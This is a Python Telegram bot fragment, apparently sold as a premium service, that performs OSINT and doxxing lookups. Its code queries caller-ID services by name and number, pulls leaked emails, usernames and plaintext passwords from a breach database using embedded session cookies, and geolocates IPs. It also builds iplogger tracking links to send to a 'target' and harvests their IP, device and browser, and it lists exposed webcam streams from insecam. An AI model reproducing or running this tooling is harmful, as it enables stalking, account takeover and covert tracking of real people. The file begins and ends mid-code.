• He is not a member of the bot
                            ''')




@bot.message_handler(commands=['964'])
def code(message):
    if str(message.chat.id) in allusers :
        try:
            name=message.text.split('/964 ')[1]
        except:
            bot.reply_to(message,'''
• send the name like this :
/966 name                 ''')
        try:
            name=message.text.split('/964 ')[1]
            bot.reply_to(message,'''
• Searching ...''')
            url = 'https://caller-id.saedhamdan.com/index.php/UserManagement/search_number?country_code=IQ&name='+name
            try:

                test=requests.post(url).json()['result']

                for i in test :
                        SEND=f'''
• Name : {name}
• Number : {i['number']}
• Country Code : {i['country_code']}
= = = = = = = = = = = = = = = = =
• By : @Eng_Hamzah_Ali
                        '''
                        bot.send_message(message.chat.id,SEND)
            except:
                SEND=f'''
• No results found, there may be a problem 
                        '''
        except:
            pass
    else:
        bot.send_message(message.chat.id,f'''
• Your ID --> '''+message.chat.id+'''
• To participate in the bot, contact:
@Eng_Hamzah_Ali''')
        for i in admin :
                    bot.send_message(i,f'''
• This user try to start bot : 
• @{message.chat.username}
• {message.chat.id}
• {message.chat.first_name}

• He is not a member of the bot
                            ''')





@bot.message_handler(commands=['20'])
def code(message):
    if str(message.chat.id) in allusers :
        try:
            name=message.text.split('/20 ')[1]
        except:
            bot.reply_to(message,'''
• send the name like this :
/966 name                 ''')
        try:
            name=message.text.split('/20 ')[1]
            bot.reply_to(message,'''
• Searching ...''')
            url = 'https://caller-id.saedhamdan.com/index.php/UserManagement/search_number?country_code=EG&name='+name
            try:

                test=requests.post(url).json()['result']

                for i in test :
                        SEND=f'''
• Name : {name}
• Number : {i['number']}
• Country Code : {i['country_code']}
= = = = = = = = = = = = = = = = =
• By : @Eng_Hamzah_Ali
                        '''
                        bot.send_message(message.chat.id,SEND)
            except:
                SEND=f'''
• No results found, there may be a problem 
                        '''
        except:
            pass
    else:
        bot.send_message(message.chat.id,f'''
• Your ID --> '''+message.chat.id+'''
• To participate in the bot, contact:
@Eng_Hamzah_Ali''')
        for i in admin :
                    bot.send_message(i,f'''
• This user try to start bot : 
• @{message.chat.username}
• {message.chat.id}
• {message.chat.first_name}

• He is not a member of the bot
                            ''')





@bot.message_handler(commands=['963'])
def code(message):
    if str(message.chat.id) in allusers :
        try:
            name=message.text.split('/963 ')[1]
        except:
            bot.reply_to(message,'''
• send the name like this :
/966 name                 ''')
        try:
            name=message.text.split('/963 ')[1]
            bot.reply_to(message,'''
• Searching ...''')
            url = 'https://caller-id.saedhamdan.com/index.php/UserManagement/search_number?country_code=SY&name='+name
            try:

                test=requests.post(url).json()['result']

                for i in test :
                        SEND=f'''
• Name : {name}
• Number : {i['number']}
• Country Code : {i['country_code']}
= = = = = = = = = = = = = = = = =
• By : @Eng_Hamzah_Ali
                        '''
                        bot.send_message(message.chat.id,SEND)
            except:
                SEND=f'''
• No results found, there may be a problem 
                        '''
        except:
            pass
    else:
        bot.send_message(message.chat.id,f'''
• Your ID --> '''+message.chat.id+'''
• To participate in the bot, contact:
@Eng_Hamzah_Ali''')
        for i in admin :
                    bot.send_message(i,f'''
• This user try to start bot : 
• @{message.chat.username}
• {message.chat.id}
• {message.chat.first_name}

• He is not a member of the bot
                            ''')




@bot.message_handler(commands=['973'])
def code(message):
    if str(message.chat.id) in allusers :
        try:
            name=message.text.split('/973 ')[1]
        except:
            bot.reply_to(message,'''
• send the name like this :
/966 name                 ''')
        try:
            name=message.text.split('/973 ')[1]
            bot.reply_to(message,'''
• Searching ...''')
            url = 'https://caller-id.saedhamdan.com/index.php/UserManagement/search_number?country_code=BH&name='+name
            try:

                test=requests.post(url).json()['result']

                for i in test :
                        SEND=f'''
• Name : {name}
• Number : {i['number']}
• Country Code : {i['country_code']}
= = = = = = = = = = = = = = = = =
• By : @Eng_Hamzah_Ali
                        '''
                        bot.send_message(message.chat.id,SEND)
            except:
                SEND=f'''
• No results found, there may be a problem 
                        '''
        except:
            pass
    else:
        bot.send_message(message.chat.id,f'''
• Your ID --> '''+message.chat.id+'''
• To participate in the bot, contact:
@Eng_Hamzah_Ali''')
        for i in admin :
                    bot.send_message(i,f'''
• This user try to start bot : 
• @{message.chat.username}
• {message.chat.id}
• {message.chat.first_name}

• He is not a member of the bot
                            ''')

def name(message=None,type=None , value=None):
    url='https://snusbase.com/search'
    headers={
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language':'ar,en-US;q=0.9,en;q=0.8',
        'Cache-Control':'max-age=0',
        'Content-Length':'78',
        'Content-Type':'application/x-www-form-urlencoded',
        'Cookie': 'a=g9sveqr1crmn2md5s50gssukk7; lg=b387d9f6fc3d96f56f9243625fb30baa2042e12509bc90073493fafedf8e7f6e; rm=dEIzWVdCNXVWemNGRzE2MS9sWEp6Zz09%3A%3A7X2dFLjBPjELGNsiojQlAw%3D%3D',
        'Origin': 'https://snusbase.com',
        'Referer': 'https://snusbase.com/search',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Sec-Ch-Ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests':'1'
    }

    data={
        'term': value,
        'searchtype': type
    }
    response=requests.post(url,headers=headers,data=data)
    src=response.content
    soup=BeautifulSoup(src)
    xemail=soup.find_all('td', {"class":"datatable xemail"})
    xusername=soup.find_all('td', {"class":"datatable xusername"})
    xhash=soup.find_all('td', {"class":"datatable xhash"})
    xname=soup.find_all('td', {"class":"datatable xname"})
    xlastip=soup.find_all('td', {"class":"datatable xlastip"})
    xpassword=soup.find_all('td', {"class":"datatable xpassword"})
    loop=0

    if type == 'email':
        serc=xemail
    elif type == 'username':
        serc=xusername
    elif type == 'name':
        serc=xname 
    elif type == 'password':
        serc=xpassword
    elif type == 'lastip':
        serc=xlastip


    for i in serc:
        try:
            email1=i.split('>')[1]
            email=email1.split('<')[0]
        except:
            email='None'


        try:
            user1=xusername[loop]
            user1=str(user1)
            user2=user1.split('>')[1]
            user=user2.split('<')[0]
        except:
            user='None'


        try: 
            user1=xpassword[loop]
            user1=str(user1)
            user2=user1.split('>')[1]
            pas=user2.split('<')[0]
        except:
            pas='None'

        try: 
            user1=xname[loop]
            user1=str(user1)
            user2=user1.split('>')[1]
            name=user2.split('<')[0]
        except:
            name='None'
        Send=f'''
• Email : {email}
• User : {user}
• Password : {pas}
• Name : {name}
'''
        bot.reply_to(message,Send)
        loop=loop+1
@bot.message_handler(commands=['Soc'])
def code(message):
    if str(message.chat.id) in ALL_VIP  :
            bot.reply_to(message,'''
• search email /SE
• search name /SN
• search username /SU
• search pasword /SP
• search IP /SI
                                            ''')
    else:
        bot.reply_to(message,'''
• For use this feature you must be a premium user
• To sign up as a premium user, contact to :
@Eng_Hamzah_Ali
                                    ''')
@bot.message_handler(commands=['SE'])
def SE(message):
    if str(message.chat.id) in ALL_VIP  :
            try:
                value=message.text.split('/SE ')[1]
                name(message=message,value=value,type='email')
            except:
                bot.reply_to(message,'''
• send the emsil like this :
/SE email                 ''')

    else:
        bot.reply_to(message,'''
• For use this feature you must be a premium user
• To sign up as a premium user, contact to :
@Eng_Hamzah_Ali
                                    ''')

@bot.message_handler(commands=['SI'])
def SI(message):
    if str(message.chat.id) in ALL_VIP  :
            try:
                value=message.text.split('/SI ')[1]
                name(message=message,value=value,type='lastip')
            except:
                bot.reply_to(message,'''
• send the emsil like this :
/SI email                 ''')

    else:
        bot.reply_to(message,'''
• For use this feature you must be a premium user
• To sign up as a premium user, contact to :
@Eng_Hamzah_Ali
                                    ''')


@bot.message_handler(commands=['SN'])
def SN(message):
    if str(message.chat.id) in ALL_VIP  :
            try:
                value=message.text.split('/SN ')[1]
                name(message=message,value=value,type='name')
            except:
                bot.reply_to(message,'''
• send the emsil like this :
/SN Name                 ''')
    else:
        bot.reply_to(message,'''
• For use this feature you must be a premium user
• To sign up as a premium user, contact to :
@Eng_Hamzah_Ali
                                    ''')                        

@bot.message_handler(commands=['SU'])
def SU(message):
    if str(message.chat.id) in ALL_VIP  :
            try:
                value=message.text.split('/SU ')[1]
                name(message=message,value=value,type='username')
            except:
                bot.reply_to(message,'''
• send the emsil like this :
/SU User                 ''')
    else:
        bot.reply_to(message,'''
• For use this feature you must be a premium user
• To sign up as a premium user, contact to :
@Eng_Hamzah_Ali
                                    ''')

@bot.message_handler(commands=['SP'])
def SP(message):
    if str(message.chat.id) in ALL_VIP :
            try:
                value=message.text.split('/SP ')[1]
                name(message=message,value=value,type='password')
            except:
                bot.reply_to(message,'''
• send the emsil like this :
/SP Pass                 ''')
    else:
        bot.reply_to(message,'''
• For use this feature you must be a premium user
• To sign up as a premium user, contact to :
@Eng_Hamzah_Ali
                                    ''')
@bot.message_handler(commands=['NUM'])
def NUM(message):
    if str(message.chat.id) in ALL_VIP:
        bot.reply_to(message,'''
• Egypt = /EG
• IRAN = /IR
• MAROCO = /MA
• ALGERIA = /DZ
• TUNISIA = /TN
• SUDAN = /SD
• SOMALIA = /SO
• LIBYA = /LB
• JORDAN = /JO
• SYRIA = /SY
• IRAQ = /IQ
• KUWAIT = /KW
• SAUDI KINGDOM = /SA
• YEMEN = /YE
• OMAN = /OM
• PALESTINE = /PS
• UAE = /AE 
• ISRAEL = /ISR
• BAHRAIN = /BH
• QATAR = /QA
                                    ''')
def get_name(country,number,message=None):
    if str(message.chat.id) in ALL_VIP:
        SEND=[]
        r=requests.get(f"http://caller-id.saedhamdan.com/index.php/UserManagement/search_number?number={number}&country_code={country}",headers={"User-Agent":"Mozilla/5.0 (Linux; Android 10; RMX1821) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4660.11 Mobile Safari/537.36"})
        SEND.append(r.json()['result'][0]['name'])
        rq=requests.get(f'http://146.148.112.105/caller/index.php/UserManagement/search_number?number={number}&country_code={country}')
        for JQ in rq.json()['result']:
            SEND.append((JQ["name"]))
        r=requests.post(f'https://devappteamcall.site/data/search_name?country={country}',data=f'&phoneNumber={number}',headers={'Authorization': 'Basic YWEyNTAyOnp1enVBaGgy','User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G977N Build/LMY49I)','Host': 'devappteamcall.site','Connection': 'close','Accept-Encoding': 'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','Content-Length': '23'})
        for name in  re.findall('"Name":"(.*?)",',str(r.json())) : 
            SEND.append(name)
        for i in SEND :
            bot.send_message(message.chat.id,f'''
• Name : {i} ''')
        bot.send_message(message.chat.id,f'''
• Done  ✔ ''')
    else:
        bot.reply_to(message,'''
• For use this feature you must be a premium user
• To sign up as a premium user, contact to :
@Eng_Hamzah_Ali
                                    ''')





    @bot.message_handler(commands=['MA'])
    def MA(message):
      if str(message.chat.id) in allusers :

        try:
            num=message.text
            num=num.split('/MA ')[1]
            messag=message
            get_name(country='MA',number=num,message=messag)

        except:
            bot.reply_to(message,'''
• send the number like this :
/MA NUMBER ''')



@bot.message_handler(commands=['IR'])
def IR(message):
  if str(message.chat.id) in allusers :

    messag=message
    try:
        num=message.text
        num=num.split('/IR ')[1]
        get_name(country='IR',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/IR NUMBER ''')

@bot.message_handler(commands=['IR'])

def DZ(message):
  if str(message.chat.id) in allusers :

    messag=message

    try:
        num=message.text
        num=num.split('/DZ ')[1]
        get_name(country='DZ',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/DZ NUMBER ''')


@bot.message_handler(commands=['TN'])

def TN(message):
  if str(message.chat.id) in allusers :

    messag=message

    try:
        num=message.text
        num=num.split('/TN ')[1]
        get_name(country='TN',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/TN NUMBER ''')

@bot.message_handler(commands=['SD'])

def SD(message):
  if str(message.chat.id) in allusers :

    messag=message

    try:
        num=message.text
        num=num.split('/SD ')[1]
        get_name(country='SD',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/SD NUMBER ''')


@bot.message_handler(commands=['SO'])

def SO(message):
  if str(message.chat.id) in allusers :

    messag=message

    try:
        num=message.text
        num=num.split('/SO ')[1]
        get_name(country='SO',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/SO NUMBER ''')





@bot.message_handler(commands=['LB'])

def LB(message):
  if str(message.chat.id) in allusers :

    messag=message

    try:
        num=message.text
        num=num.split('/LB ')[1]
        get_name(country='LB',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/LB NUMBER ''')






@bot.message_handler(commands=['JO'])

def JO(message):
  if str(message.chat.id) in allusers :

    messag=message

    try:
        num=message.text
        num=num.split('/JO ')[1]
        get_name(country='JO',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/JO NUMBER ''')






@bot.message_handler(commands=['SY'])

def SY(message):
  if str(message.chat.id) in allusers :

    messag=message

    try:
        num=message.text
        num=num.split('/SY ')[1]
        get_name(country='SY',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/SY NUMBER ''')
@bot.message_handler(commands=['IQ'])

def IQ(message):
  if str(message.chat.id) in allusers :

    messag=message

    try:
        num=message.text
        num=num.split('/IQ ')[1]
        get_name(country='IQ',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/IQ NUMBER ''')


@bot.message_handler(commands=['KW'])

def KW(message):
  if str(message.chat.id) in allusers :
    messag=message
    try:
        num=message.text
        num=num.split('/KW ')[1]
        get_name(country='KW',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/KW NUMBER ''')

@bot.message_handler(commands=['SA'])

def SA(message):
  if str(message.chat.id) in allusers :

    messag=message
    try:
        num=message.text
        num=num.split('/SA ')[1]
        get_name(country='SA',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/SA NUMBER ''')





@bot.message_handler(commands=['YE'])

def YE(message):
  if str(message.chat.id) in allusers :

    messag=message

    try:
        num=message.text
        num=num.split('/YE ')[1]
        get_name(country='YE',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/YE NUMBER ''')
@bot.message_handler(commands=['OM'])

def OM(message):
  if str(message.chat.id) in allusers :

    messag=message

    try:
        num=message.text
        num=num.split('/OM ')[1]
        get_name(country='OM',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/OM NUMBER ''')
@bot.message_handler(commands=['PS'])

def PS(message):
  if str(message.chat.id) in allusers :

    messag=message

    try:
        num=message.text
        num=num.split('/PS ')[1]
        get_name(country='PS',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/PS NUMBER ''')
@bot.message_handler(commands=['AE'])

def AE(message):
  if str(message.chat.id) in allusers :

    messag=message

    try:
        num=message.text
        num=num.split('/AE ')[1]
        get_name(country='AE',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/AE NUMBER ''')
@bot.message_handler(commands=['ISR'])

def ISR(message):
  if str(message.chat.id) in allusers :
    messag=message

    try:
        num=message.text
        num=num.split('/ISR ')[1]
        get_name(country='ISR',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/ISR NUMBER ''')
@bot.message_handler(commands=['BH'])

def BH(message):
  if str(message.chat.id) in allusers :

    messag=message

    try:
        num=message.text
        num=num.split('/BH ')[1]
        get_name(country='BH',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/BH NUMBER ''')
@bot.message_handler(commands=['QA'])

def QA(message):
  if str(message.chat.id) in allusers :

    messag=message

    try:
        num=message.text
        num=num.split('/QA ')[1]
        get_name(country='QA',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/QA NUMBER ''')


@bot.message_handler(commands=['EG'])

def EG(message):
  if str(message.chat.id) in allusers :

    messag=message

    try:
        num=message.text
        num=num.split('/EG ')[1]
        get_name(country='EG',number=num,message=messag)

    except:
        bot.reply_to(message,'''
• send the number like this :
/EG NUMBER ''')















@bot.message_handler(commands=['info_ip'])

def info_ip(message):
    if str(message.chat.id) in allusers:
        try:
            num=message.text
            ip=num.split('/info_ip ')[1]
            url=f'https://demo.ip-api.com/json/{ip}?fields=66842623&lang=en'
            headers={
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Host': 'demo.ip-api.com',
            'Origin': 'https://ip-api.com',
            'Referer': 'https://ip-api.com/',
            'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': "Windows",
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
            }

            req=requests.post(url,headers=headers)
            status=(f'• status : '+req.json()['status'])
            continent=(f'• continent : '+req.json()['continent'])
            continentCode=('• continentCode : '+req.json()['continentCode'])
            country=('• country : '+req.json()['country'])
            countryCode=('• countryCode : '+req.json()['countryCode'])
            region=('• region : '+req.json()['region'])
            regionName=('• regionName : '+req.json()['regionName'])
            city=('• city : '+req.json()['city'])
            district=('• district : '+req.json()['district'])
            zip=('• zip : '+req.json()['zip'])
            timezone=('• timezone : '+req.json()['timezone'])
            currency=('• currency : '+req.json()['currency'])
            isp=('• isp : '+req.json()['isp'])
            aD=('• as : '+req.json()['as'])
            asname=('• asname : '+req.json()['asname'])
            query=('• query : '+req.json()['query'])
            lat=('• lat : '+str(req.json()['lat']))
            lon=('• lon : '+str(req.json()['lon']))
            offset=('• offset : '+str(req.json()['offset']))
            mobile=('• mobile : '+str(req.json()['mobile']))
            proxy=('• proxy : '+str(req.json()['proxy']))
            hosting=('• hosting : '+str(req.json()['hosting']))



            Location=('• Location : '+str(req.json()['lat'])+','+str(req.json()['lon']))
            bot.reply_to(message,f'''
• Info {ip} ip : 

{status}
{continent}
{continentCode}
{country}
{countryCode}
{region}
{regionName}
{city}
{district}
{zip}
{timezone}
{currency}
{isp}
{aD}
{asname}
{query}
{lat}
{lon}
{offset}
{mobile}
{proxy}
{hosting}
{Location}

''')
        except:
            bot.reply_to(message,'''
• send the ip like this :
/info_ip ip ''')

    else:
        bot.reply_to(message,'''
• For use this feature you must be a premium user
• To sign up as a premium user, contact to :
@Eng_Hamzah_Ali
                                    ''')





@bot.message_handler(commands=['fake_url'])
def fake_url(message):
    if str(message.chat.id) in allusers:
            num=message.text
            url_target=num.split('/fake_url ')[1]
            confirmations=['KWYRphjj6bsZHC8BHrm3hyEnimqb3ZHC']
            confirmation=random.choice(confirmations)
            for i in range(0,6):
                try:

                        headers={
                        'Cookie': f'375263813869706608=3; cookies-consent=1681911304; confirmation={confirmation}; clhf03028ja=104.243.212.47; 375263811760810031=2; cursor=yWlDv0C0j60002E2O7l9D601akLxepAX; _ga=GA1.2.{secrets.token_hex(9)}.{secrets.token_hex(10)}; cto_bundle={secrets.token_hex(9)*5}; loggers=eG5UazRwdk10bEVyLDlrVGs0bUUyRkxzQyxMalRrNGw0eE1yV3oseGRUazQzdlduMERlLExDaWs0aGxzS1JMdyxuQ2lrNDc4WDFlWkUsczM0MTRUZHdzcW5uLE0yNDE0UkszMzh4UA%3D%3D; _gat_gtag_UA_67516667_1=1; turnback=logger%2FxnTk4pvMtlEr%2F; __gads=ID={secrets.token_hex(16)}-{secrets.token_hex(16)}:T={secrets.token_hex(10)}:S=ALNI_MYW-{secrets.token_hex(25)}; __gpi=UID=00000c067042987c:T=1681910959:RT=1697222398:S=ALNI_MZGEdRfPY5ppKzmj0zxPjiEFfo5Kg; integrity=DWqpRE0mlSmL4KFVIyULTntM; _ga_7FSG7D195N=GS1.1.1697220603.2.1.1697222401.54.0.0; _ga=GA1.2.18843998.1681910958',
                        'Origin': 'https://iplogger.org',
                        'Referer': 'https://iplogger.org/',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                        'X-Requested-With':'XMLHttpRequest'}


                        data={
                            'destination': url_target
                        }
                        url = 'https://iplogger.org/create/shortlink/'
                        response=requests.post(url,headers=headers,data=data).json()
                        go=(response['go'].split('/logger/')[1])
                        link=go.split('/')[0]
                        code_url1=link
                        break
                except:
                        confirmation=random.choice(confirmations)
                        continue





            url1='https://iplogger.org/logger/'+link
            headers1={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',

                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'Cookie':  f'375263813158706608=3; cookies-consent=1681911304; confirmation={confirmation}; clhf03028ja=104.243.212.47; 375263811760810031=2; cursor=yWlDv0C0j60002E2O7l9D601akLxepAX; _ga=GA1.2.{secrets.token_hex(9)}.{secrets.token_hex(10)}; cto_bundle={secrets.token_hex(9)*5}; loggers=eG5UazRwdk10bEVyLDlrVGs0bUUyRkxzQyxMalRrNGw0eE1yV3oseGRUazQzdlduMERlLExDaWs0aGxzS1JMdyxuQ2lrNDc4WDFlWkUsczM0MTRUZHdzcW5uLE0yNDE0UkszMzh4UA%3D%3D; _gat_gtag_UA_67516667_1=1; turnback=logger%2FxnTk4pvMtlEr%2F; __gads=ID={secrets.token_hex(16)}-{secrets.token_hex(16)}:T={secrets.token_hex(10)}:S=ALNI_MYW-{secrets.token_hex(25)}; __gpi=UID=00000c067042987c:T=1681910959:RT=1697222398:S=ALNI_MZGEdRfPY5ppKzmj0zxPjiEFfo5Kg; integrity=DWqpRE0mlSmL4KFVIyULTntM; _ga_7FSG7D195N=GS1.1.1697220603.2.1.1697222401.54.0.0; _ga=GA1.2.18843998.1681910958',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
            }
            res=requests.get(url1,headers=headers1).text
            code1=(res.split('		<button data-name="share" data-dialog="logger-share" data-shortlink-place="share" data-shortlink="')[1])
            code=code1.split('" data-prepare="share"')[0]
            code_url2=code.split('/')[3]







            res2=requests.post('https://iplogger.org/logger/update/',headers={
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
                'Sec-Ch-Ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                'Sec-Ch-Ua-Mobile':'?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Origin': 'https://iplogger.org' ,
                'Referer': 'https://iplogger.org/logger/'+code_url1,
                'Content-Length': '60',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Upgrade-Insecure-Requests': '1',
                'Cookie':  f'375263813158706608=3; cookies-consent=1681911304; confirmation={confirmation}; clhf03028ja=104.243.212.47; 375263811760810031=2; cursor=yWlDv0C0j60002E2O7l9D601akLxepAX; _ga=GA1.2.{secrets.token_hex(9)}.{secrets.token_hex(10)}; cto_bundle={secrets.token_hex(9)*5}; loggers=eG5UazRwdk10bEVyLDlrVGs0bUUyRkxzQyxMalRrNGw0eE1yV3oseGRUazQzdlduMERlLExDaWs0aGxzS1JMdyxuQ2lrNDc4WDFlWkUsczM0MTRUZHdzcW5uLE0yNDE0UkszMzh4UA%3D%3D; _gat_gtag_UA_67516667_1=1; turnback=logger%2FxnTk4pvMtlEr%2F; __gads=ID={secrets.token_hex(16)}-{secrets.token_hex(16)}:T={secrets.token_hex(10)}:S=ALNI_MYW-{secrets.token_hex(25)}; __gpi=UID=00000c067042987c:T=1681910959:RT=1697222398:S=ALNI_MZGEdRfPY5ppKzmj0zxPjiEFfo5Kg; integrity=DWqpRE0mlSmL4KFVIyULTntM; _ga_7FSG7D195N=GS1.1.1697220603.2.1.1697222401.54.0.0; _ga=GA1.2.18843998.1681910958',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest'

            },data={
            'code': code_url1,
            'name': 'shortlink',
            'domain': '2no.co',
            'manual': code_url2}).text
            bot.send_message(message.chat.id,f'[-] = This is the link you send to the target ==>> https://2no.co/'+code_url2 )
            ips=[]
            address=''
            for i in range(0,60):
                    url1='https://iplogger.org/logger/'
                    headers1={
                        'Accept': 'application/json, text/javascript, */*; q=0.01',

                        'Sec-Ch-Ua-Mobile': '?0',
                        'Sec-Ch-Ua-Platform': '"Windows"',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'none',
                        'Sec-Fetch-User': '?1',
                        'Origin': 'https://iplogger.org', 
                        'Referer': 'https://iplogger.org/logger/'+code_url1,
                        'Upgrade-Insecure-Requests': '1',
                        'Cookie': f'375263813158706608=3; cookies-consent=1681911304; confirmation={confirmation}; clhf03028ja=104.243.212.47; 375263811760810031=2; cursor=yWlDv0C0j60002E2O7l9D601akLxepAX; _ga=GA1.2.{secrets.token_hex(9)}.{secrets.token_hex(10)}; cto_bundle={secrets.token_hex(9)*5}; loggers=eG5UazRwdk10bEVyLDlrVGs0bUUyRkxzQyxMalRrNGw0eE1yV3oseGRUazQzdlduMERlLExDaWs0aGxzS1JMdyxuQ2lrNDc4WDFlWkUsczM0MTRUZHdzcW5uLE0yNDE0UkszMzh4UA%3D%3D; _gat_gtag_UA_67516667_1=1; turnback=logger%2FxnTk4pvMtlEr%2F; __gads=ID={secrets.token_hex(16)}-{secrets.token_hex(16)}:T={secrets.token_hex(10)}:S=ALNI_MYW-{secrets.token_hex(25)}; __gpi=UID=00000c067042987c:T=1681910959:RT=1697222398:S=ALNI_MZGEdRfPY5ppKzmj0zxPjiEFfo5Kg; integrity=DWqpRE0mlSmL4KFVIyULTntM; _ga_7FSG7D195N=GS1.1.1697220603.2.1.1697222401.54.0.0; _ga=GA1.2.18843998.1681910958',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                    res=requests.post(url1,headers=headers1,data={
            'interval': 'all',
            'filters': '',
            'page': '1',
            'sort': 'ip',
            'order': 'desc',
            'code': code_url1}).json()
                    for i in res:
                        print(res)
                        try:
                            if address in ips :
                                    pass
                            else:
                                    date=i.split('<div class="ip-date">')[1]
                                    date=date.split('</div>')[0]
                                    time=i.split('<div class="ip-time">')[1]
                                    time=time.split('</div>')[0]
                                    address=i.split('<div class="ip-address">')[1]
                                    address=address.split('</div>')[0]
                                    platform=i.split('<div class="platform" data-icon=')[1]
                                    platform=platform.split('<span>')[1]
                                    platform=platform.split('</span>')[0]
                                    browser=i.split('<div class="browser" data-icon=')[1]
                                    browser=browser.split('<span>')[1]
                                    browser=browser.split('</span>')[0]
                                    useragent=i.split('class="visitor-useragent"><div>')[1]
                                    useragent=useragent.split('</div>')[0]
                                    address=('• address : '+address)
                                    browser=('• browser : ' +browser)
                                    platform=('• device : '+platform)
                                    time=('• time : '+time)
                                    date=('• date : '+date)
                                    useragent=('• useragent : '+useragent)
                                    sent=f'''
    {address}
    {browser}
    {platform}
    {time}
    {date}
    {useragent}

    '''
                                    ips.append(address)

                                    bot.reply_to(message,sent)
                        except:
                            pass
                        sleep(4)

    else:
            bot.reply_to(message,f'''
• Your ID --> '''+message.chat.id+'''
• To participate in the bot, contact:
@Eng_Hamzah_Ali''')
            for i in admin :
                    bot.send_message(i,f'''
• This user try to start bot : 
• @{message.chat.username}
• {message.chat.id}
• {message.chat.first_name}

• He is not a member of the bot
                            ''')




def cam(message,co):
    try:
        headers = {"User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0"}
        res = requests.get(f"http://www.insecam.org/en/bycountry/{co}", headers=headers).text
        page = re.findall(r'pagenavigator\("\?page=", (\d+)', res)[0]
    except:
        pass
    for dead in range(int(page)):
        req = requests.get(f"http://www.insecam.org/en/bycountry/{co}/?page={page}" ,headers=headers).text
        ip = re.findall(r"http://\d+.\d+.\d+.\d+:\d+", req)

        for i in ip:
            bot.reply_to(message,f'''
• {i}''')







@bot.message_handler(commands=['cams'])
def cams(message):
        if str(message.chat.id) in allusers:
            bot.reply_to(message,f'''
• US --> United States
• KR --> Korea, Republic Of
• JP --> Japan
• TW --> Taiwan, Province Of 
• IT --> Italy
• RU --> Russian Federation
• DE --> Germany
• FR --> France
• AT --> Austria
• CZ --> Czech Republic
• CH --> Switzerland
• PL --> Poland
• CA --> Canada
• GB --> United Kingdom
• RO --> Romania
• NO --> Norway
• NL --> Netherlands
• ES --> Spain
• SE --> Sweden
• BG --> Bulgaria
• IR --> Iran, Islamic Republic
• DK --> Denmark
